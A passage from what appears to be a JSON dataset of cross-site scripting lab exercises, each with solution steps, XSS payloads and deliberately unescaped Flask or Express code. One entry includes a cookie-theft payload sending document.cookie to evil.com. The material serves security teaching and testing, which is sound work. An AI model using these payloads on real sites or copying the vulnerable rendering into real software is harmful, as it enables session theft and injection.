    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet poll = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/poll', (req, res) => {\n  const opts = poll.map(o => `<label><input type='radio' name='vote'>${o}</label><br>`).join('');\n  res.send(`<html><body>${opts}<form action='/add-option' method='POST'><input name='opt'><button>Add Option</button></form></body></html>`);\n});\n\napp.post('/add-option', (req, res) => {\n  poll.push(req.body.opt);\n  res.redirect('/poll');\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Ticket Support System - Message Preview",
    "Lab Description": "A customer support portal displays a preview of a message before submitting a ticket. The message content is rendered in real-time on the preview panel without sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to the support ticket form.",
      "Enter an XSS payload in the 'message' field.",
      "Observe that the preview panel immediately reflects the payload.",
      "Use a payload that triggers JavaScript execution in the preview area."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/support', methods=['GET'])\ndef support_form():\n    return '''\n    <html>\n        <body>\n            <form action='/submit' method='POST'>\n                <textarea name='message' oninput=\"document.getElementById('preview').innerHTML = this.value\"></textarea>\n                <div id='preview'></div>\n                <button type='submit'>Send</button>\n            </form>\n        </body>\n    </html>\n    '''\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    return 'Ticket submitted'\n\napp.run(port=5006)"
  },
  {
    "Lab scenario": "Reflected XSS in Search Page with Dynamic Breadcrumb",
    "Lab Description": "The search feature updates the page breadcrumb dynamically based on the search query. The search term is reflected into an innerHTML context without sanitization.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Search for any keyword using the search bar.",
      "Inspect how the breadcrumb reflects the search term.",
      "Inject a payload as part of the search term.",
      "Confirm JavaScript execution."
    ],
    "payloads": [
      "\"><img src=x onerror=alert(1)>",
      "<script>alert(document.domain)</script>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    term = request.args.get('q', '')\n    return f'''\n    <html>\n        <body>\n            <div id='breadcrumb'>Search &gt; <span id='search-term'>{term}</span></div>\n            <p>Showing results for: {term}</p>\n        </body>\n    </html>\n    '''\n\napp.run(port=5007)"
  },
  {
    "Lab scenario": "DOM XSS via Client-side Parsed JSON Data",
    "Lab Description": "A blog site loads post content from a JSON file and injects it into the DOM using `innerHTML`. Malicious script in the JSON data can lead to DOM-based XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Modify the JSON endpoint or intercept it via Burp.",
      "Insert a malicious script inside the blog content.",
      "Observe script execution after DOM injection.",
      "Use payloads inside the blog content object."
    ],
    "payloads": [
      "<script>alert('DOM XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, jsonify, request\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return '''\n    <html>\n        <body>\n            <div id='blog'></div>\n            <script>\n                fetch('/data').then(res => res.json()).then(data => {\n                    document.getElementById('blog').innerHTML = data.content;\n                });\n            </script>\n        </body>\n    </html>\n    '''\n\n@app.route('/data')\ndef data():\n    return jsonify({\"content\": \"<h1>Welcome</h1>\"})\n\napp.run(port=5008)"
  },
  {
    "Lab scenario": "XSS in User Comments with Template Literals",
    "Lab Description": "A forum app renders user comments using JavaScript template literals without escaping content, allowing injection of script tags.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a comment with an XSS payload.",
      "Observe the comment list where content is rendered with backtick-based templates.",
      "Payload will execute as part of the rendered comment."
    ],
    "payloads": [
      "<img src=x onerror=alert('comment')>",
      "<script>alert('comment xss')</script>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, request\napp = Flask(__name__)\ncomments = []\n\n@app.route('/', methods=['GET', 'POST'])\ndef home():\n    if request.method == 'POST':\n        comments.append(request.form['comment'])\n    comment_html = ''.join([f\"<li>{c}</li>\" for c in comments])\n    return f'''\n    <html>\n        <body>\n            <form method='POST'>\n                <input name='comment'>\n                <button>Post</button>\n            </form>\n            <ul id='list'></ul>\n            <script>\n                const comments = `{comment_html}`;\n                document.getElementById('list').innerHTML = comments;\n            </script>\n        </body>\n    </html>\n    '''\n\napp.run(port=5009)"
  },
  {
    "Lab scenario": "Stored XSS in Markdown Blog Renderer",
    "Lab Description": "A blogging platform allows users to post content using Markdown. The Markdown is rendered client-side, but HTML tags inside the Markdown are not sanitized.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create a new blog post using Markdown syntax.",
      "Include raw HTML/script inside the Markdown content.",
      "The renderer converts and displays it directly into the DOM.",
      "Use script tags to confirm code execution."
    ],
    "payloads": [
      "<script>alert('markdown')</script>",
      "<img src=x onerror=alert('markdown xss')>",
      "<svg onload=alert('xss')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\nposts = []\n\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'POST':\n        posts.append(request.form['content'])\n    rendered = '<br>'.join(posts)\n    return f'''\n    <html>\n        <body>\n            <form method='POST'>\n                <textarea name='content'></textarea>\n                <button>Post</button>\n            </form>\n            <div id='posts'>{rendered}</div>\n        </body>\n    </html>\n    '''\n\napp.run(port=5010)"
  },
  {
    "Lab scenario": "Reflected XSS in Email Verification Error Message",
    "Lab Description": "An email verification system reflects the email address directly into an error message when a malformed email is entered. The input is rendered unsanitized into an HTML element.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit a malformed email containing a payload.",
      "Observe the reflected error message on the page.",
      "If executed, the payload triggers JavaScript."
    ],
    "payloads": [
      "<script>alert('email')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/verify')\ndef verify():\n    email = request.args.get('email', '')\n    if '@' not in email:\n        return f\"\"\"\n        <html>\n            <body>\n                <p>Email verification failed: {email}</p>\n            </body>\n        </html>\n        \"\"\"\n    return 'Verified'\n\napp.run(port=5011)"
  },
  {
    "Lab scenario": "Stored XSS in Product Reviews Section",
    "Lab Description": "A shopping site allows users to leave reviews on products. Reviews are displayed on the product page without sanitizing HTML tags.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a product review containing a script payload.",
      "Visit the product page afterward.",
      "The review is rendered as HTML, executing the payload."
    ],
    "payloads": [
      "<script>alert('review')</script>",
      "<img src=x onerror=alert('stored xss')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\nreviews = []\n\n@app.route('/', methods=['GET', 'POST'])\ndef product():\n    if request.method == 'POST':\n        reviews.append(request.form['review'])\n    review_html = '<br>'.join(reviews)\n    return f'''\n    <html>\n        <body>\n            <h2>Product A</h2>\n            <form method='POST'>\n                <textarea name='review'></textarea>\n                <button>Submit</button>\n            </form>\n            <div>{review_html}</div>\n        </body>\n    </html>\n    '''\n\napp.run(port=5012)"
  },
  {
    "Lab scenario": "DOM XSS via URL Fragment Injection",
    "Lab Description": "A single-page app reads the URL hash fragment and displays it in the interface without validation. This allows an attacker to inject JavaScript that executes in the DOM context.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify the URL fragment after the hash (#).",
      "Inject a script payload into the fragment.",
      "The JavaScript reads the fragment and injects it into innerHTML."
    ],
    "payloads": [
      "#<img src=x onerror=alert('dom xss')>",
      "#<script>alert('xss')</script>",
      "#<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return '''\n    <html>\n        <body>\n            <div id='frag'></div>\n            <script>\n                const hash = window.location.hash.substring(1);\n                document.getElementById('frag').innerHTML = hash;\n            </script>\n        </body>\n    </html>\n    '''\n\napp.run(port=5013)"
  },
  {
    "Lab scenario": "XSS in Admin-only Notes Panel (Privilege Escalation Risk)",
    "Lab Description": "Admin panel loads user notes stored in a database and renders them into a dashboard using innerHTML. Users can insert stored notes which, if viewed by admin, execute XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a crafted note entry.",
      "Wait for an admin to view the notes page.",
      "Payload executes in the admin browser session."
    ],
    "payloads": [
      "<script>fetch('/admin/cookie',{method:'POST',body:document.cookie})</script>",
      "<img src=x onerror=document.location='http://evil.com/?'+document.cookie>",
      "<svg/onload=alert('admin')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\nnotes = []\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    notes.append(request.form['note'])\n    return 'Note submitted'\n\n@app.route('/admin')\ndef admin():\n    rendered = ''.join([f\"<div>{n}</div>\" for n in notes])\n    return f\"\"\"\n    <html>\n        <body>\n            <h2>Admin Notes Panel</h2>\n            {rendered}\n        </body>\n    </html>\n    \"\"\"\n\napp.run(port=5014)"
  },
  {
    "Lab scenario": "XSS in Image Upload Preview using FileReader",
    "Lab Description": "The application previews uploaded image filenames using FileReader and injects the name into the DOM without sanitization, allowing for payloads in fake image names.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a fake image with a malicious filename like \"><script>alert(1)</script>.",
      "Upload it using the form.",
      "Observe XSS execution when the preview is rendered."
    ],
    "payloads": [
      "\"><svg/onload=alert(1)>",
      "\"><script>alert(1)</script>",
      "\"><img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask\napp = Flask(__name__)\n\n@app.route('/')\ndef upload():\n    return '''\n    <html>\n        <body>\n            <input type='file' onchange='handleFile(this.files[0])'>\n            <div id='preview'></div>\n            <script>\n                function handleFile(file) {\n                    document.getElementById('preview').innerHTML = file.name;\n                }\n            </script>\n        </body>\n    </html>\n    '''\n\napp.run(port=5015)"
  },
  {
    "Lab scenario": "XSS via Profile Avatar Upload Preview",
    "Lab Description": "The web application allows users to upload profile pictures. It provides an immediate preview by rendering the uploaded image file name into an `img` tag using client-side JavaScript. However, no sanitization is applied to the file name, leading to potential script injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to the profile picture upload section.",
      "Use the file picker or intercept the request and change the filename to include an XSS payload.",
      "Observe the preview functionality rendering the malicious payload in the `img` tag."
    ],
    "payloads": [
      "\"><img src=x onerror=alert(1)>",
      "\"><svg onload=alert(1)>",
      "<script>alert(1)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/', methods=['GET', 'POST'])\ndef upload():\n    if request.method == 'POST':\n        filename = request.form.get('filename')\n        return render_template_string(f\"\"\"\n            <html>\n                <body>\n                    <h3>Upload Preview</h3>\n                    <img src='/uploads/{filename}'>\n                    <form method='POST'>\n                        <input name='filename'>\n                        <button type='submit'>Upload</button>\n                    </form>\n                </body>\n            </html>\n        \"\"\")\n    return '''<form method='POST'><input name='filename'><button type='submit'>Upload</button></form>'''\n\napp.run()"
  },
  {
    "Lab scenario": "XSS in Search Auto-Completion Suggestions",
    "Lab Description": "The application returns dynamic auto-suggestions for search input. The response is built using unsanitized input directly rendered into a dropdown list without escaping, allowing XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to the search bar and type an XSS payload.",
      "Observe the auto-suggestions rendering the input directly inside HTML.",
      "Trigger JavaScript execution through injected payload."
    ],
    "payloads": [
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>",
      "<script>alert('AutoXSS')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    q = request.args.get('q', '')\n    return f\"<ul><li>{q}</li><li>{q} books</li></ul>\"\n\napp.run()"
  },
  {
    "Lab scenario": "Reflected XSS in Contact Us Confirmation",
    "Lab Description": "The application reflects submitted data in a confirmation page after the user fills out the contact form. The input is echoed back without encoding, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit the contact form with a payload in the 'name' field.",
      "Observe the output rendered in the confirmation page.",
      "Check for JavaScript execution."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "\"><img src=x onerror=alert(1)>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/', methods=['GET', 'POST'])\ndef contact():\n    if request.method == 'POST':\n        name = request.form.get('name')\n        return f\"<h3>Thanks for contacting us, {name}!</h3>\"\n    return '''<form method='POST'><input name='name'><button type='submit'>Submit</button></form>'''\n\napp.run()"
  },
  {
    "Lab scenario": "XSS in E-Commerce Coupon Feedback",
    "Lab Description": "An e-commerce site allows users to submit coupon feedback. The feedback is stored and displayed on a page using innerHTML without sanitization, introducing a DOM-based XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit feedback with an XSS payload via the coupon section.",
      "Visit the feedback page and observe the stored comment rendered unsafely.",
      "Observe the DOM-based execution of your payload."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, request, redirect\n\napp = Flask(__name__)\nfeedbacks = []\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    msg = request.form.get('msg')\n    feedbacks.append(msg)\n    return redirect('/feedback')\n\n@app.route('/feedback')\ndef feedback():\n    out = ''.join(f\"<div>{f}</div>\" for f in feedbacks)\n    return f\"<html><body>{out}</body></html>\"\n\n@app.route('/')\ndef form():\n    return '''<form action='/submit' method='POST'><input name='msg'><button type='submit'>Send</button></form>'''\n\napp.run()"
  },
  {
    "Lab scenario": "XSS in Newsletter Subscription Confirmation Page",
    "Lab Description": "After signing up for a newsletter, the application reflects the submitted email on a confirmation page using innerHTML. No sanitization is applied.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Enter a payload as the email value and submit the form.",
      "Observe the reflected value in the confirmation page triggering script execution."
    ],
    "payloads": [
      "\"><script>alert('XSS')</script>",
      "\"><img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, request, redirect\n\napp = Flask(__name__)\n\n@app.route('/subscribe', methods=['POST'])\ndef subscribe():\n    email = request.form.get('email')\n    return f\"<h3>Subscribed successfully with {email}</h3>\"\n\n@app.route('/')\ndef form():\n    return '''<form action='/subscribe' method='POST'><input name='email'><button type='submit'>Subscribe</button></form>'''\n\napp.run()"
  },
  {
    "Lab scenario": "XSS via Redirect Message in OAuth Flow",
    "Lab Description": "An application uses a message passed in the redirect URL during OAuth flow to display feedback. The message is inserted into the DOM without sanitization, leading to DOM-based XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft a redirect URL with a malicious `message` parameter.",
      "Complete the login flow and observe the message displayed unsafely.",
      "Trigger the XSS."
    ],
    "payloads": [
      "<script>alert('OAuth XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/callback')\ndef callback():\n    msg = request.args.get('message', '')\n    return f\"<div>{msg}</div>\"\n\napp.run()"
  },
  {
    "Lab scenario": "XSS in Image Gallery Caption",
    "Lab Description": "Users can submit images with custom captions. The captions are rendered under the image using innerHTML without sanitization, making it vulnerable to XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit an image with an XSS payload as a caption.",
      "View the gallery and confirm script execution."
    ],
    "payloads": [
      "<img src=x onerror=alert('XSS')>",
      "<script>alert('Gallery')</script>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, request, redirect\n\napp = Flask(__name__)\ngallery = []\n\n@app.route('/upload', methods=['POST'])\ndef upload():\n    caption = request.form.get('caption')\n    gallery.append(caption)\n    return redirect('/gallery')\n\n@app.route('/gallery')\ndef view():\n    return ''.join(f\"<div>{c}</div>\" for c in gallery)\n\n@app.route('/')\ndef form():\n    return '''<form method='POST' action='/upload'><input name='caption'><button>Submit</button></form>'''\n\napp.run()"
  },
  {
    "Lab scenario": "XSS via Admin Panel Alert Message",
    "Lab Description": "Admin panel shows alert messages based on URL parameters. This is inserted directly into the page using innerHTML.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Visit `/admin?alert=...` with an XSS payload.",
      "Confirm execution in the alert box."
    ],
    "payloads": [
      "<script>alert('Admin XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/admin')\ndef admin():\n    alert = request.args.get('alert', '')\n    return f\"<div class='alert'>{alert}</div>\"\n\napp.run()"
  },
  {
    "Lab scenario": "XSS in Tag-Based Blog Filtering",
    "Lab Description": "Blog allows filtering posts by tag using a `tag` URL parameter. The tag name is echoed on the page title and body unsanitized.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Visit the tag filter with a payload as the `tag` value.",
      "Observe the vulnerable reflection in the DOM and page title.",
      "Trigger script execution."
    ],
    "payloads": [
      "<script>alert('Tag XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/blog')\ndef blog():\n    tag = request.args.get('tag', '')\n    return f\"<html><head><title>{tag}</title></head><body>Showing posts tagged: {tag}</body></html>\"\n\napp.run()"
  },
  {
    "Lab scenario": "XSS in Live Chat Widget",
    "Lab Description": "The live chat widget reflects user input messages using innerHTML without sanitization. This leads to real-time DOM-based XSS for other users.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a message with XSS payload.",
      "View the live chat log from another user session.",
      "Observe XSS trigger."
    ],
    "payloads": [
      "<script>alert('Chat XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\nchat_log = []\n\n@app.route('/chat', methods=['GET', 'POST'])\ndef chat():\n    if request.method == 'POST':\n        msg = request.form.get('msg')\n        chat_log.append(msg)\n    messages = ''.join(f\"<div>{m}</div>\" for m in chat_log)\n    return f'''<form method='POST'><input name='msg'><button>Send</button></form>{messages}'''\n\napp.run()"
  },
  {
    "Lab scenario": "XSS in Newsletter Archive Viewer",
    "Lab Description": "The application archives past newsletters and displays them via an ID in the URL. The raw HTML content of the newsletter is rendered without sanitization, making it vulnerable to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Subscribe to the newsletter and submit an XSS payload in the subscription form.",
      "Wait for the newsletter archive to reflect your submission.",
      "Access the archive viewer using the newsletter ID and observe script execution."
    ],
    "payloads": [
      "<script>alert('XSS Newsletter')</script>",
      "<img src=x onerror=alert('XSS Newsletter')>",
      "<svg/onload=alert('XSS Newsletter')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nconst newsletters = {};\nlet id = 1;\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/submit-newsletter', (req, res) => {\n  newsletters[id] = req.body.content;\n  res.redirect('/archive/' + id++);\n});\napp.get('/archive/:id', (req, res) => {\n  res.send(`<html><body>${newsletters[req.params.id]}</body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS via Order Confirmation Message",
    "Lab Description": "After placing an order, the application reflects the user's full name in the confirmation message via a GET parameter. This reflection happens directly in the HTML response without escaping.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Craft a URL with a payload in the `name` parameter.",
      "Access the URL and observe the execution of JavaScript in the confirmation message."
    ],
    "payloads": [
      "\"><script>alert('Order XSS')</script>",
      "<img src=x onerror=alert('Order XSS')>",
      "<svg/onload=alert('Order XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/confirmation', (req, res) => {\n  const name = req.query.name;\n  res.send(`<html><body><h1>Thank you, ${name}</h1></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Dynamic FAQ Generator",
    "Lab Description": "The FAQ page allows admins to update questions and answers dynamically. These entries are stored and rendered as HTML blocks without escaping user input.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Login as admin and insert a new FAQ with a script payload.",
      "Visit the public FAQ page and observe script execution."
    ],
    "payloads": [
      "<script>alert('FAQ XSS')</script>",
      "<iframe src='javascript:alert(`FAQ XSS`)'></iframe>",
      "<img src=1 onerror=alert('FAQ XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet faqs = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/admin/faq', (req, res) => {\n  faqs.push({ q: req.body.question, a: req.body.answer });\n  res.redirect('/faq');\n});\napp.get('/faq', (req, res) => {\n  let html = '<html><body>';\n  faqs.forEach(f => {\n    html += `<div><h3>${f.q}</h3><p>${f.a}</p></div>`;\n  });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Job Application Portal",
    "Lab Description": "Applicants can submit resumes along with a cover letter. The letter is stored and displayed to HR staff using unsafe innerHTML rendering.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a cover letter containing an XSS payload.",
      "Login as HR and review the application.",
      "Observe script execution in the resume review panel."
    ],
    "payloads": [
      "<script>alert('Job App XSS')</script>",
      "<img src=x onerror=alert('Job App XSS')>",
      "<svg/onload=alert('Job App XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet applications = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/apply', (req, res) => {\n  applications.push(req.body.letter);\n  res.redirect('/thankyou');\n});\napp.get('/hr', (req, res) => {\n  let html = '<html><body>';\n  applications.forEach(l => {\n    html += `<div>${l}</div>`;\n  });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Markdown Previewer",
    "Lab Description": "The application allows users to preview markdown content. However, certain HTML is not stripped properly, enabling attackers to inject malicious scripts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a post with markdown that includes a raw HTML payload.",
      "Trigger the preview functionality.",
      "Observe JavaScript execution due to unsafe rendering."
    ],
    "payloads": [
      "<script>alert('Markdown XSS')</script>",
      "<svg/onload=alert('Markdown XSS')>",
      "<img src=x onerror=alert('Markdown XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet previews = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/preview', (req, res) => {\n  previews.push(req.body.markdown);\n  res.redirect('/preview-list');\n});\napp.get('/preview-list', (req, res) => {\n  let html = '<html><body>';\n  previews.forEach(p => {\n    html += `<div>${p}</div>`;\n  });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Invoice Comments Section",
    "Lab Description": "A SaaS accounting platform allows users to add internal comments on invoices. These comments are rendered using raw HTML without sanitization when the invoice is viewed by managers.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Login as a regular user and add a malicious comment to an invoice.",
      "Ensure the invoice is viewed by a manager.",
      "Observe execution of JavaScript from the comment."
    ],
    "payloads": [
      "<script>alert('Invoice XSS')</script>",
      "<img src=x onerror=alert('Invoice XSS')>",
      "<svg/onload=alert('Invoice XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet invoices = {1: []};\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/invoice/1/comment', (req, res) => {\n  invoices[1].push(req.body.comment);\n  res.redirect('/invoice/1');\n});\napp.get('/invoice/1', (req, res) => {\n  let html = '<html><body><h2>Invoice #1</h2>';\n  invoices[1].forEach(c => { html += `<p>${c}</p>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Chat Message Formatting",
    "Lab Description": "A real-time support chat allows users to format their messages using pseudo-HTML tags. These tags are not properly parsed or sanitized before rendering, leading to script execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a message containing an XSS payload in HTML-like formatting.",
      "Wait for the support staff to view the chat window.",
      "Observe execution of the script inside the message bubble."
    ],
    "payloads": [
      "<b onmouseover=alert('Chat XSS')>Hello</b>",
      "<i><img src=1 onerror=alert('Chat XSS')></i>",
      "<u><svg/onload=alert('Chat XSS')></u>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet chats = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/chat', (req, res) => {\n  chats.push(req.body.message);\n  res.redirect('/support');\n});\napp.get('/support', (req, res) => {\n  let html = '<html><body><h2>Support Chat</h2>';\n  chats.forEach(m => { html += `<div>${m}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Project Collaboration Comments",
    "Lab Description": "Team members can leave comments on shared tasks within a collaboration platform. These comments are stored in plain text but rendered as HTML without escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post a comment containing an XSS payload.",
      "Open the project task page.",
      "Observe execution of JavaScript injected via comment."
    ],
    "payloads": [
      "<script>alert('Collab XSS')</script>",
      "<img src=x onerror=alert('Collab XSS')>",
      "<svg/onload=alert('Collab XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/task/comment', (req, res) => {\n  comments.push(req.body.text);\n  res.redirect('/task');\n});\napp.get('/task', (req, res) => {\n  let html = '<html><body><h2>Task Discussion</h2>';\n  comments.forEach(c => { html += `<div>${c}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Survey Answer Summary",
    "Lab Description": "The application displays summary results of a public survey. One of the questions allows free text input and is rendered in the admin dashboard without escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a survey response with a malicious input.",
      "Login as admin and view the survey results.",
      "Observe the script execution from the user-submitted answer."
    ],
    "payloads": [
      "<script>alert('Survey XSS')</script>",
      "<img src=1 onerror=alert('Survey XSS')>",
      "<svg/onload=alert('Survey XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet answers = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/survey', (req, res) => {\n  answers.push(req.body.q);\n  res.redirect('/thankyou');\n});\napp.get('/admin/results', (req, res) => {\n  let html = '<html><body><h2>Survey Answers</h2>';\n  answers.forEach(a => { html += `<li>${a}</li>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Payment Status Checker",
    "Lab Description": "The application shows payment status based on user input via a GET parameter. The input is reflected into the page directly, introducing a reflected XSS vulnerability.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to the status check URL with a payload in the `txn` parameter.",
      "Observe the script execution from the reflected content."
    ],
    "payloads": [
      "<script>alert('Payment XSS')</script>",
      "<img src=x onerror=alert('Payment XSS')>",
      "<svg/onload=alert('Payment XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/payment/status', (req, res) => {\n  const txn = req.query.txn;\n  res.send(`<html><body><h1>Status for: ${txn}</h1></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Product Feedback Widget",
    "Lab Description": "An e-commerce site includes a feedback widget where users can share thoughts about products. These inputs are stored and displayed in the admin review page without proper sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback with a script payload.",
      "Login to admin panel and check feedbacks.",
      "Observe execution of script on feedback display."
    ],
    "payloads": [
      "<script>alert('Feedback XSS')</script>",
      "<img src=x onerror=alert('Feedback XSS')>",
      "<svg/onload=alert('Feedback XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
